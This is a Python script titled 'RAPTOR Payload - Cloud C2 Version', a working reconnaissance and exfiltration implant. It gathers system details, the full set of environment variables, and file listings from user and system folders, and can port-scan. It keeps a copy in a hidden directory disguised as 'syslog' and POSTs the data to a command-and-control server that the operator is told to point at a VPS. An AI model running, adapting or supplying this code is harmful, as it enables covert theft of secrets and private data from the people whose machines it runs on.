#!/usr/bin/env python3

"""
RAPTOR Payload - Cloud C2 Version
Configured for remote C2 server deployment

This is a modified version of payload_v2.py optimized for cloud deployment.
Update the C2_SERVER variable below with your VPS address.
"""

import json
import os
import platform
import socket
import subprocess
import sys
import time
from datetime import datetime
from pathlib import Path

try:
    import psutil
    import requests
except ImportError:
    print("[ERROR] Missing dependencies. Install with: pip install psutil requests")
    sys.exit(1)

# ═══════════════════════════════════════════════════════════════════════════
# CONFIGURATION - UPDATE THESE VALUES FOR YOUR DEPLOYMENT
# ═══════════════════════════════════════════════════════════════════════════

# Your VPS C2 server address
# Examples:
#   C2_SERVER = "https://your-domain.com"           # With SSL (recommended)
#   C2_SERVER = "http://your-vps-ip"                # Without SSL
#   C2_SERVER = "http://123.45.67.89"               # Direct IP
C2_SERVER = "http://127.0.0.1:8000"  # ⚠️ CHANGE THIS TO YOUR VPS!

# Full C2 endpoint
C2_ENDPOINT = f"{C2_SERVER}/api/submit_scan/"

# Reconnaissance settings
MAX_FILES = 500       # Maximum number of files to enumerate
MAX_DEPTH = 3         # Maximum directory depth to traverse
ENABLE_PORT_SCAN = False  # Set to True to enable port scanning (may be detected)

# Port scanning configuration (if enabled)
TARGET_HOST = "127.0.0.1"  # Target for port scan (typically localhost)
PORT_RANGE_START = 1       # Start port
PORT_RANGE_END = 1024      # End port (1-1024 for common services)

# Local logging
LOCAL_LOG_DIR = Path.home() / ".cache" / "syslog"  # Hidden directory
SAVE_LOCAL_COPY = True     # Save recon data locally as backup

# Stealth settings
SILENT_MODE = False        # Suppress console output
TIMEOUT_SECONDS = 30       # Network timeout for C2 communication

# ═══════════════════════════════════════════════════════════════════════════


def log(message, level="INFO"):
    """Log messages to console (unless silent mode)"""
    if not SILENT_MODE:
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        print(f"[{timestamp}] [{level}] {message}")


def get_target_directories():
    """Get OS-specific target directories for file enumeration"""
    system = platform.system()
    home = Path.home()
    
    directories = []
    
    if system == "Windows":
        directories = [
            home / "Documents",
            home / "Desktop",
            home / "Downloads",
            home / "AppData" / "Roaming",
            Path("C:/ProgramData"),
        ]
    elif system == "Darwin":  # macOS
        directories = [
            home / "Documents",
            home / "Desktop",
            home / "Downloads",
            home / "Library",
        ]
    else:  # Linux
        directories = [
            home / "Documents",
            home / "Desktop",
            home / "Downloads",
            home / ".config",
            Path("/etc"),
            Path("/var/log"),
        ]
    
    # Filter to only existing directories
    return [d for d in directories if d.exists()]


def enumerate_files(directories, max_files=500, max_depth=3):
    """
    Recursively enumerate files from given directories
    
    Args:
        directories: List of Path objects to enumerate
        max_files: Maximum number of files to collect
        max_depth: Maximum directory depth to traverse
        
    Returns:
        List of file metadata dictionaries
    """
    files = []
    
    for base_dir in directories:
        if len(files) >= max_files:
            break
            
        try:
            for root, dirs, filenames in os.walk(base_dir):
                # Calculate current depth
                depth = len(Path(root).relative_to(base_dir).parts)
                
                if depth >= max_depth:
                    dirs.clear()  # Don't traverse deeper
                    continue
                
                for filename in filenames:
                    if len(files) >= max_files:
                        break
                        
                    file_path = Path(root) / filename
                    
                    try:
                        stat = file_path.stat()
                        
                        files.append({
                            'name': filename,
                            'path': str(file_path),
                            'size': stat.st_size,
                            'created': datetime.fromtimestamp(stat.st_ctime).isoformat(),
                            'modified': datetime.fromtimestamp(stat.st_mtime).isoformat(),
                            'extension': file_path.suffix.lower(),
                            'is_hidden': filename.startswith('.'),
                        })
                    except (PermissionError, FileNotFoundError, OSError):
                        # Skip files we can't access
                        continue
                        
        except (PermissionError, OSError) as e:
            log(f"Error accessing {base_dir}: {e}", "WARNING")
            continue
    
    log(f"Enumerated {len(files)} files from {len(directories)} directories")
    return files


def gather_system_info():
    """Gather comprehensive system information"""
    log("Gathering system information...")
    
    try:
        info = {
            'hostname': socket.gethostname(),
            'os_name': platform.system(),
            'os_version': platform.version(),
            'os_release': platform.release(),
            'architecture': platform.machine(),
            'processor': platform.processor(),
            'username': os.getlogin() if hasattr(os, 'getlogin') else os.environ.get('USER', 'unknown'),
            'is_admin': os.getuid() == 0 if hasattr(os, 'getuid') else False,
            'python_version': platform.python_version(),
            'cpu_count': psutil.cpu_count(),
            'ram_total_gb': round(psutil.virtual_memory().total / (1024**3), 2),
            'disk_total_gb': round(psutil.disk_usage('/').total / (1024**3), 2),
            'boot_time': datetime.fromtimestamp(psutil.boot_time()).isoformat(),
            'env_vars': dict(os.environ),
        }
        
        log(f"System info: {info['hostname']} ({info['os_name']} {info['os_release']})")
        return info
        
    except Exception as e:
        log(f"Error gathering system info: {e}", "ERROR")
        return {'error': str(e)}


def scan_ports(target, start_port=1, end_port=1024, timeout=0.5):
    """
    Scan ports on target host (CAUTION: May be detected by IDS/IPS)
    
    Args:
        target: Target hostname/IP
        start_port: Starting port number
        end_port: Ending port number
        timeout: Socket timeout in seconds
        
    Returns:
        List of open ports
    """
    if not ENABLE_PORT_SCAN:
        log("Port scanning disabled", "INFO")
        return []
    
    log(f"Scanning ports {start_port}-{end_port} on {target}...")
    open_ports = []
    
    for port in range(start_port, end_port + 1):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(timeout)
            result = sock.connect_ex((target, port))
            
            if result == 0:
                open_ports.append(port)
                
            sock.close()
            
        except socket.error:
            continue
    
    log(f"Found {len(open_ports)} open ports")
    return open_ports


def send_to_c2(payload, c2_url, timeout=30):
    """
    Send reconnaissance data to C2 server
    
    Args:
        payload: Dictionary containing recon data
        c2_url: C2 server endpoint URL
        timeout: Request timeout in seconds
        
    Returns:
        Tuple of (success: bool, session_id: str or None, error: str or None)
    """
    log(f"Sending data to C2 server: {c2_url}")
    
    try:
        response = requests.post(
            c2_url,
            json=payload,
            timeout=timeout,
            headers={'Content-Type': 'application/json'}
        )
        
        if response.status_code == 201:
            data = response.json()
            session_id = data.get('session_id')
            log(f"✅ Data sent successfully! Session ID: {session_id}", "SUCCESS")
            return True, session_id, None
            
        else:
            error = f"Server returned status {response.status_code}: {response.text}"
            log(error, "ERROR")
            return False, None, error
            
    except requests.exceptions.ConnectionError as e:
        error = f"Connection error: Cannot reach C2 server at {c2_url}"
        log(error, "ERROR")
        return False, None, error
        
    except requests.exceptions.Timeout:
        error = f"Request timeout after {timeout} seconds"
        log(error, "ERROR")
        return False, None, error
        
    except Exception as e:
        error = f"Unexpected error: {e}"
        log(error, "ERROR")
        return False, None, error


def save_local_copy(payload, log_dir):
    """Save reconnaissance data locally as backup"""
    if not SAVE_LOCAL_COPY:
        return
    
    try:
        # Create hidden log directory
        log_dir.mkdir(parents=True, exist_ok=True)
        
        # Generate filename with timestamp
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        log_file = log_dir / f"recon_{timestamp}.json"
        
        # Write JSON data
        with open(log_file, 'w') as f:
            json.dump(payload, f, indent=2)
        
        log(f"Local copy saved: {log_file}")
        
    except Exception as e:
        log(f"Failed to save local copy: {e}", "WARNING")


def poll_session_status(session_id, c2_server, max_attempts=30, interval=2):
    """
    Poll C2 server for session status until complete
    
    Args:
        session_id: Session UUID
        c2_server: Base C2 server URL
        max_attempts: Maximum polling attempts
        interval: Seconds between polls
        
    Returns:
        Final session data or None
    """
    status_url = f"{c2_server}/api/session/{session_id}/"
    log(f"Polling session status: {status_url}")
    
    for attempt in range(max_attempts):
        try:
            response = requests.get(status_url, timeout=10)
            
            if response.status_code == 200:
                data = response.json()
                status = data.get('status')
                
                log(f"Session status: {status} (attempt {attempt + 1}/{max_attempts})")
                
                if status == 'complete':
                    log("✅ Session processing complete!", "SUCCESS")
                    return data
                    
            time.sleep(interval)
            
        except Exception as e:
            log(f"Error polling status: {e}", "WARNING")
    
    log("Session did not complete within timeout", "WARNING")
    return None


def main():
    """Main execution flow"""
    log("=" * 60)
    log("RAPTOR Payload - Cloud C2 Version")
    log("=" * 60)
    
    # Validate C2 configuration
    if C2_SERVER == "http://127.0.0.1:8000":
        log("⚠️  WARNING: C2_SERVER still set to localhost!", "WARNING")
        log("⚠️  Update C2_SERVER variable with your VPS address", "WARNING")
    
    # Step 1: Gather system information
    system_info = gather_system_info()
    
    # Step 2: Enumerate files
    target_dirs = get_target_directories()
    log(f"Target directories: {[str(d) for d in target_dirs]}")
    
    files = enumerate_files(
        directories=target_dirs,
        max_files=MAX_FILES,
        max_depth=MAX_DEPTH
    )
    
    # Step 3: Port scan (if enabled)
    open_ports = []
    if ENABLE_PORT_SCAN:
        open_ports = scan_ports(
            target=TARGET_HOST,
            start_port=PORT_RANGE_START,
            end_port=PORT_RANGE_END
        )
    
    # Step 4: Build payload
    payload = {
        'recon_data': {
            **system_info,
            'files': files,
            'open_ports': open_ports,
            'timestamp': datetime.now().isoformat(),
        }
    }
    
    # Step 5: Save local copy
    save_local_copy(payload, LOCAL_LOG_DIR)
    
    # Step 6: Send to C2
    success, session_id, error = send_to_c2(
        payload=payload,
        c2_url=C2_ENDPOINT,
        timeout=TIMEOUT_SECONDS
    )
    
    if not success:
        log("Failed to send data to C2 server", "ERROR")
        log(f"Data saved locally at: {LOCAL_LOG_DIR}", "INFO")
        return 1
    
    # Step 7: Poll for results (optional)
    log("Waiting for C2 processing...")
    final_data = poll_session_status(session_id, C2_SERVER)
    
    if final_data:
        summary = final_data.get('summary', {})
        log("=" * 60)
        log("FINAL RESULTS:")
        log(f"  Risk Level: {summary.get('overall_risk_level', 'unknown')}")
        log(f"  Sensitive Files: {summary.get('sensitive_files_found', 0)}")
        log(f"  Total Findings: {summary.get('total_findings', 0)}")
        if final_data.get('report_path'):
            log(f"  Report: {C2_SERVER}{final_data['report_path']}")
        log("=" * 60)
    
    log("✅ Payload execution complete!")
    return 0


if __name__ == "__main__":
    try:
        sys.exit(main())
    except KeyboardInterrupt:
        log("\n⚠️  Interrupted by user", "WARNING")
        sys.exit(130)
    except Exception as e:
        log(f"Fatal error: {e}", "ERROR")
        sys.exit(1)
